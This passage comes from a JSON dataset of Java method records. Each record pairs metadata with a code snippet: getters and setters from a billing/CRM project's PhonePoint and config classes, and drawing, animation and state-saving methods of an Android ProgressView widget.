"12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58736, "method_name": "getId", "class_name": "PhonePoint", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getId()\n\t{\n\t\treturn id;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/phone/PhonePoint.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58737, "method_name": "setId", "class_name": "PhonePoint", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setId( int id )\n\t{\n\t\tthis.id = id;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/phone/PhonePoint.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58738, "method_name": "getSourceId", "class_name": "PhonePoint", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getSourceId()\n\t{\n\t\treturn sourceId;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/phone/PhonePoint.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58739, "method_name": "setSourceId", "class_name": "PhonePoint", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setSourceId( int sourceId )\n\t{\n\t\tthis.sourceId = sourceId;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/phone/PhonePoint.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58740, "method_name": "getPeriod", "class_name": "PhonePoint", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getPeriod()\n\t{\n\t\treturn period;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/phone/PhonePoint.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58741, "method_name": "setPeriod", "class_name": "PhonePoint", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setPeriod( String period )\n\t{\n\t\tthis.period = period;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/phone/PhonePoint.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58742, "method_name": "getType", "class_name": "PhonePoint", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getType()\n\t{\n\t\treturn type;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/phone/PhonePoint.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58743, "method_name": "setType", "class_name": "PhonePoint", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setType( int type )\n\t{\n\t\tthis.type = type;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/phone/PhonePoint.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58744, "method_name": "getDateFrom", "class_name": "PhonePoint", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "\tpublic Date getDateFrom()\n\t{\n\t\treturn dateFrom;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/phone/PhonePoint.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58745, "method_name": "setDateFrom", "class_name": "PhonePoint", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDateFrom( Date dateFrom )\n\t{\n\t\tthis.dateFrom = dateFrom;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/phone/PhonePoint.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58746, "method_name": "getDateTo", "class_name": "PhonePoint", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "\tpublic Date getDateTo()\n\t{\n\t\treturn dateTo;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/phone/PhonePoint.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58747, "method_name": "setDateTo", "class_name": "PhonePoint", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDateTo( Date dateTo )\n\t{\n\t\tthis.dateTo = dateTo;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/phone/PhonePoint.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58748, "method_name": "getClientNumbers", "class_name": "PhonePoint", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getClientNumbers()\n\t{\n\t\treturn clientNumbers;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/phone/PhonePoint.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58749, "method_name": "setClientNumbers", "class_name": "PhonePoint", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setClientNumbers( String clinetNumbers )\n\t{\n\t\tthis.clientNumbers = clinetNumbers;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/phone/PhonePoint.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58750, "method_name": "setObjectId", "class_name": "PhonePoint", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setObjectId( int objectId )\n\t{\n\t\tthis.objectId = objectId;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/phone/PhonePoint.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58751, "method_name": "getObjectId", "class_name": "PhonePoint", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getObjectId()\n\t{\n\t\treturn objectId;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/phone/PhonePoint.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58752, "method_name": "getId", "class_name": "LinkProcessCreateConfigItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getId()\n\t{\n\t\treturn id;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/process/config/LinkProcessCreateConfigItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58753, "method_name": "getTitle", "class_name": "LinkProcessCreateConfigItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getTitle()\n\t{\n\t\treturn title;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/process/config/LinkProcessCreateConfigItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58754, "method_name": "getProcessTypeId", "class_name": "LinkProcessCreateConfigItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getProcessTypeId()\n\t{\n\t\treturn processTypeId;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/process/config/LinkProcessCreateConfigItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58755, "method_name": "getLinkType", "class_name": "LinkProcessCreateConfigItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getLinkType()\n\t{\n\t\treturn linkType;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/process/config/LinkProcessCreateConfigItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58756, "method_name": "getExpression", "class_name": "LinkProcessCreateConfigItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getExpression()\n\t{\n\t\treturn expression;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/process/config/LinkProcessCreateConfigItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58757, "method_name": "getCopyParamsMapping", "class_name": "LinkProcessCreateConfigItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getCopyParamsMapping()\n\t{\n\t\treturn copyParamsMapping;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/process/config/LinkProcessCreateConfigItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58758, "method_name": "getCopyLinks", "class_name": "LinkProcessCreateConfigItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getCopyLinks()\n\t{\n\t\treturn copyLinks;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/process/config/LinkProcessCreateConfigItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58759, "method_name": "onMeasure", "class_name": "ProgressView", "params": ["int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {\n        int width;\n        int height;\n\n        int viewWidth = mCircleRadius + this.getPaddingLeft() + this.getPaddingRight();\n        int viewHeight = mCircleRadius + this.getPaddingTop() + this.getPaddingBottom();\n\n        int widthMode = MeasureSpec.getMode(widthMeasureSpec);\n        int widthSize = MeasureSpec.getSize(widthMeasureSpec);\n\n        int heightMode = MeasureSpec.getMode(heightMeasureSpec);\n        int heightSize = MeasureSpec.getSize(heightMeasureSpec);\n\n        switch (widthMode) {\n            case MeasureSpec.EXACTLY:\n                width = widthSize;\n                break;\n            case MeasureSpec.AT_MOST:\n            case MeasureSpec.UNSPECIFIED:\n                width = Math.min(viewWidth, widthSize);\n                break;\n            default:\n                width = viewWidth;\n                break;\n        }\n\n        if (heightMode == MeasureSpec.EXACTLY || widthMode == MeasureSpec.EXACTLY) {\n            height = heightSize;\n        } else if (heightMode == MeasureSpec.AT_MOST) {\n            height = Math.min(viewHeight, heightSize);\n        } else {\n            height = viewHeight;\n        }\n\n        setMeasuredDimension(width, height);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58760, "method_name": "onSizeChanged", "class_name": "ProgressView", "params": ["int", "int", "int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onSizeChanged(int w, int h, int oldw, int oldh) {\n        super.onSizeChanged(w, h, oldw, oldh);\n\n        setupBounds(w, h);\n        setupPaints();\n        invalidate();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58761, "method_name": "setupPaints", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setupPaints() {\n        mBarPaint.setColor(mBarColor);\n        mBarPaint.setAntiAlias(true);\n        mBarPaint.setStyle(Style.STROKE);\n        mBarPaint.setStrokeWidth(mBarWidth);\n\n        mRimPaint.setColor(mRimColor);\n        mRimPaint.setAntiAlias(true);\n        mRimPaint.setStyle(Style.STROKE);\n        mRimPaint.setStrokeWidth(mRimWidth);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58762, "method_name": "setupBounds", "class_name": "ProgressView", "params": ["int", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setupBounds(int layoutWidth, int layoutHeight) {\n        int paddingTop = getPaddingTop();\n        int paddingBottom = getPaddingBottom();\n        int paddingLeft = getPaddingLeft();\n        int paddingRight = getPaddingRight();\n\n        if (!mFillRadius) {\n            // Width should equal to Height, find the min value to setup the circle\n            int minValue = Math.min(layoutWidth - paddingLeft - paddingRight,\n                    layoutHeight - paddingBottom - paddingTop);\n\n            int circleDiameter = Math.min(minValue, mCircleRadius * 2 - mBarWidth * 2);\n\n            // Calc the Offset if needed for centering the wheel in the available space\n            int xOffset = (layoutWidth - paddingLeft - paddingRight - circleDiameter) / 2 + paddingLeft;\n            int yOffset = (layoutHeight - paddingTop - paddingBottom - circleDiameter) / 2 + paddingTop;\n\n            mCircleBounds = new RectF(xOffset + mBarWidth, yOffset + mBarWidth, xOffset + circleDiameter - mBarWidth,\n                            yOffset + circleDiameter - mBarWidth);\n        } else {\n            mCircleBounds = new RectF(paddingLeft + mBarWidth, paddingTop + mBarWidth,\n                    layoutWidth - paddingRight - mBarWidth, layoutHeight - paddingBottom - mBarWidth);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58763, "method_name": "setCallback", "class_name": "ProgressView", "params": ["ProgressCallback"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCallback(ProgressCallback progressCallback) {\n        mCallback = progressCallback;\n\n        if (!isSpinning) {\n            runCallback();\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58764, "method_name": "onDraw", "class_name": "ProgressView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        canvas.drawArc(mCircleBounds, 360, 360, false, mRimPaint);\n\n        boolean mustInvalidate = false;\n\n        if (!mShouldAnimate) {\n            return;\n        }\n\n        if (isSpinning) {\n            //Draw the spinning bar\n            mustInvalidate = true;\n\n            long deltaTime = (SystemClock.uptimeMillis() - mLastTimeAnimated);\n            float deltaNormalized = deltaTime * mSpinSpeed / 1000.0f;\n\n            updateBarLength(deltaTime);\n\n            mProgress += deltaNormalized;\n            if (mProgress > 360) {\n                mProgress -= 360f;\n\n                // A full turn has been completed\n                // we run the callback with -1 in case we want to\n                // do something, like changing the color\n                runCallback(-1.0f);\n            }\n            mLastTimeAnimated = SystemClock.uptimeMillis();\n\n            float from = mProgress - 90;\n            float length = BAR_LENGTH + mBarExtraLength;\n\n            if (isInEditMode()) {\n                from = 0;\n                length = 135;\n            }\n\n            canvas.drawArc(mCircleBounds, from, length, false, mBarPaint);\n        } else {\n            float oldProgress = mProgress;\n\n            if (mProgress != mTargetProgress) {\n                //We smoothly increase the progress bar\n                mustInvalidate = true;\n\n                float deltaTime = (float) (SystemClock.uptimeMillis() - mLastTimeAnimated) / 1000;\n                float deltaNormalized = deltaTime * mSpinSpeed;\n\n                mProgress = Math.min(mProgress + deltaNormalized, mTargetProgress);\n                mLastTimeAnimated = SystemClock.uptimeMillis();\n            }\n\n            if (oldProgress != mProgress) {\n                runCallback();\n            }\n\n            float offset = 0.0f;\n            float progress = mProgress;\n            if (!mLinearProgress) {\n                float factor = 2.0f;\n                offset = (float) (1.0f - Math.pow(1.0f - mProgress / 360.0f, 2.0f * factor)) * 360.0f;\n                progress = (float) (1.0f - Math.pow(1.0f - mProgress / 360.0f, factor)) * 360.0f;\n            }\n\n            if (isInEditMode()) {\n                progress = 360;\n            }\n\n            canvas.drawArc(mCircleBounds, offset - 90, progress, false, mBarPaint);\n        }\n\n        if (mustInvalidate) {\n            invalidate();\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58765, "method_name": "onVisibilityChanged", "class_name": "ProgressView", "params": ["View", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onVisibilityChanged(@NonNull View changedView, int visibility) {\n        super.onVisibilityChanged(changedView, visibility);\n\n        if (visibility == VISIBLE) {\n            mLastTimeAnimated = SystemClock.uptimeMillis();\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58766, "method_name": "updateBarLength", "class_name": "ProgressView", "params": ["long"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void updateBarLength(long deltaTimeInMilliSeconds) {\n        if (mPausedTimeWithoutGrowing >= PAUSE_GROWING_TIME) {\n            mTimeStartGrowing += deltaTimeInMilliSeconds;\n\n            if (mTimeStartGrowing > mBarSpinCycleTime) {\n                // We completed a size change cycle\n                // (growing or shrinking)\n                mTimeStartGrowing -= mBarSpinCycleTime;\n                //if(mBarGrowingFromFront) {\n                mPausedTimeWithoutGrowing = 0;\n                //}\n                mBarGrowingFromFront = !mBarGrowingFromFront;\n            }\n\n            float distance =\n                    (float) Math.cos((mTimeStartGrowing / mBarSpinCycleTime + 1) * Math.PI) / 2 + 0.5f;\n            float destLength = (BAR_MAX_LENGTH - BAR_LENGTH);\n\n            if (mBarGrowingFromFront) {\n                mBarExtraLength = distance * destLength;\n            } else {\n                float newLength = destLength * (1 - distance);\n                mProgress += (mBarExtraLength - newLength);\n                mBarExtraLength = newLength;\n            }\n        } else {\n            mPausedTimeWithoutGrowing += deltaTimeInMilliSeconds;\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58767, "method_name": "isSpinning", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isSpinning() {\n        return isSpinning;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58768, "method_name": "resetCount", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void resetCount() {\n        mProgress = 0.0f;\n        mTargetProgress = 0.0f;\n        invalidate();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58769, "method_name": "stopSpinning", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void stopSpinning() {\n        isSpinning = false;\n        mProgress = 0.0f;\n        mTargetProgress = 0.0f;\n        invalidate();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58770, "method_name": "spin", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void spin() {\n        mLastTimeAnimated = SystemClock.uptimeMillis();\n        isSpinning = true;\n        invalidate();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58771, "method_name": "runCallback", "class_name": "ProgressView", "params": ["float"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void runCallback(float value) {\n        if (mCallback != null) {\n            mCallback.onProgressUpdate(value);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58772, "method_name": "runCallback", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void runCallback() {\n        if (mCallback != null) {\n            float normalizedProgress = (float) Math.round(mProgress * 100 / 360.0f) / 100;\n            mCallback.onProgressUpdate(normalizedProgress);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58773, "method_name": "setInstantProgress", "class_name": "ProgressView", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setInstantProgress(float progress) {\n        if (isSpinning) {\n            mProgress = 0.0f;\n            isSpinning = false;\n        }\n\n        if (progress > 1.0f) {\n            progress -= 1.0f;\n        } else if (progress < 0) {\n            progress = 0;\n        }\n\n        if (progress == mTargetProgress) {\n            return;\n        }\n\n        mTargetProgress = Math.min(progress * 360.0f, 360.0f);\n        mProgress = mTargetProgress;\n        mLastTimeAnimated = SystemClock.uptimeMillis();\n        invalidate();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58774, "method_name": "onSaveInstanceState", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Parcelable", "snippet": "    public Parcelable onSaveInstanceState() {\n        WheelSavedState savedState = new WheelSavedState(super.onSaveInstanceState());\n        // We save everything that can be changed at runtime\n        savedState.mProgress = this.mProgress;\n        savedState.mTargetProgress = this.mTargetProgress;\n        savedState.isSpinning = this.isSpinning;\n        savedState.spinSpeed = this.mSpinSpeed;\n        savedState.barWidth = this.mBarWidth;\n        savedState.barColor = this.mBarColor;\n        savedState.rimWidth = this.mRimWidth;\n        savedState.rimColor = this.mRimColor;\n        savedState.circleRadius = this.mCircleRadius;\n        savedState.linearProgress = this.mLinearProgress;\n        savedState.fillRadius = this.mFillRadius;\n        return savedState;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58775, "method_name": "onRestoreInstanceState", "class_name": "ProgressView", "params": ["Parcelable"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onRestoreInstanceState(Parcelable state) {\n        if (!(state instanceof WheelSavedState)) {\n            super.onRestoreInstanceState(state);\n            return;\n        }\n\n        WheelSavedState savedState = (WheelSavedState) state;\n        super.onRestoreInstanceState(savedState.getSuperState());\n\n        this.mProgress = savedState.mProgress;\n        this.mTargetProgress = savedState.mTargetProgress;\n        this.isSpinning = savedState.isSpinning;\n        this.mSpinSpeed = savedState.spinSpeed;\n        this.mBarWidth = savedState.barWidth;\n        this.mBarColor = savedState.barColor;\n        this.mRimWidth = savedState.rimWidth;\n        this.mRimColor = savedState.rimColor;\n        this.mCircleRadius = savedState.circleRadius;\n        this.mLinearProgress = savedState.linearProgress;\n        this.mFillRadius = savedState.fillRadius;\n\n        this.mLastTimeAnimated = SystemClock.uptimeMillis();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58776, "method_name": "getProgress", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getProgress() {\n        return isSpinning ? -1 : mProgress / 360.0f;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58777, "method_name": "setProgress", "class_name": "ProgressView", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setProgress(float progress) {\n        if (isSpinning) {\n            mProgress = 0.0f;\n            isSpinning = false;\n\n            runCallback();\n        }\n\n        if (progress > 1.0f) {\n            progress -= 1.0f;\n        } else if (progress < 0) {\n            progress = 0;\n        }\n\n        if (progress == mTargetProgress) {\n            return;\n        }\n\n        // If we are currently in the right position\n        // we set again the last time animated so the\n        // animation starts smooth from here\n        if (mProgress == mTargetProgress) {\n            mLastTimeAnimated = SystemClock.uptimeMillis();\n        }\n\n        mTargetProgress = Math.min(progress * 360.0f, 360.0f);\n\n        invalidate();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58778, "method_name": "setLinearProgress", "class_name": "ProgressView", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLinearProgress(boolean isLinear) {\n        mLinearProgress = isLinear;\n        if (!isSpinning) {\n            invalidate();\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58779, "method_name": "getCircleRadius", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCircleRadius() {\n        return mCircleRadius;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58780, "method_name": "setCircleRadius", "class_name": "ProgressView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCircleRadius(int circleRadius) {\n        this.mCircleRadius = circleRadius;\n        if (!isSpinning) {\n            invalidate();\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58781, "method_name": "getBarWidth", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getBarWidth() {\n        return mBarWidth;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58782, "method_name": "setBarWidth", "class_name": "ProgressView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setBarWidth(int barWidth) {\n        this.mBarWidth = barWidth;\n        if (!isSpinning) {\n            invalidate();\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58783, "method_name": "getBarColor", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getBarColor() {\n        return mBarColor;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58784, "method_name": "setBarColor", "class_name": "ProgressView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setBarColor(int barColor) {\n        this.mBarColor = barColor;\n        setupPaints();\n        if (!isSpinning) {\n            invalidate();\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58785, "method_name": "getRimColor", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getRimColor() {\n        return mRimColor;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58786, "method_name": "setRimColor", "class_name": "ProgressView", "params": ["int"], 